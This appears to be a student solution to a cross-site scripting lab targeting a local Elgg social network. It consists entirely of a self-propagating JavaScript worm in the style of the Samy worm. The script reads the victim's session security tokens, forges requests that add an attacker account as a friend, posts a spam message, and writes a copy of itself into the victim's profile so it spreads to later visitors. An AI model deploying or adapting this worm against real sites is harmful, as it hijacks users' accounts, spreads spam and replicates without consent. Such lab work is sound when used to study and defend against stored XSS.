
<script id=worm>
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	alert(jsCode);
    window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
    
    
	var guid = elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var owner = elgg.session.user.name ;
	var samyProfile="http://www.xsslabelgg.com/profile/samy";//samy id link
	var ownerProfile="http://www.xsslabelgg.com/profile/"+owner.toLowerCase();//visitor id link
	var pageOwner=elgg.page_owner.username;
	var pageOwnerProfile="http://www.xsslabelgg.com/profile/"+pageOwner;//visiting page owner id link 
	//Construct the content of your url.
   
    //-----------adding samy as a friend--------------

	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&";//add samy as friend 
	sendurl=sendurl+ts+token+ts+token; 

	//Create and send Ajax request to add friend
    if(owner != 'Samy'){
    	       var Ajax=null;
	           Ajax=new XMLHttpRequest();
	           Ajax.open("GET",sendurl,true);
	           Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	           Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	           Ajax.send();
	 }

	//---posting a wire --------
    sendurl="http://www.xsslabelgg.com/action/thewire/add"; //posting a wire 
	var content="__elgg_token="+token+"&__elgg_ts="+ts+"&";
    content=content+"body=To+earn+12+USD/Hour(!),+visit+now"+" "+pageOwnerProfile;
   
	if(owner != 'Samy')
	 {
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);

	 }
    

	//---------save worm code to user profile 
    sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
    content="__elgg_token="+token+"&__elgg_ts="+ts+"&";
    content=content+"accesslevel[description]=2&description="+wormCode+"&guid="+guid;

	if(owner != 'Samy')
	 {
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);

	 }
 }

</script>

